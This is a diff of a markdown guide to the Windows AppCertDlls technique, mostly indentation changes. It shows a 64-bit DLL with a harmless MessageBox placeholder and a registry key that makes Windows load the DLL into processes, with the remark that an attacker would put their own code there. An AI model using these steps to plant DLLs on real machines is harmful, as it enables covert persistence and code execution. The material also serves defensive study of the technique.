@@ -11,34 +11,34 @@ So I tried it and indeed it works. These are the steps I have followed:
 
 1. Create a 64-bit DLL which does this in the DllMain function:
 
-```
-BOOL APIENTRY DllMain( HMODULE hModule,
+ ```
+ BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
                      )
-{
+ {
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-MessageBox(NULL, L"Hello world from DLL!", L"Hello world", 0x0);
+	MessageBox(NULL, L"Hello world from DLL!", L"Hello world", 0x0);
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
         break;
     }
     return TRUE;
-}
-```
+ }
+ ```
 
-Of course, as an attacker, you would place your code here. 
+ Of course, as an attacker, you would place your code here. 
 
-2. I have compiled it to 64-bit.
+2. Make sure to compile it to 64-bit.
 
 3. Create a registry key:
 
-```
-HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls
-```
+ ```
+ HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls
+ ```
 
 3. Add in that registry key a value name `yadayada` with string data `PATH_TO_DLL`.
 
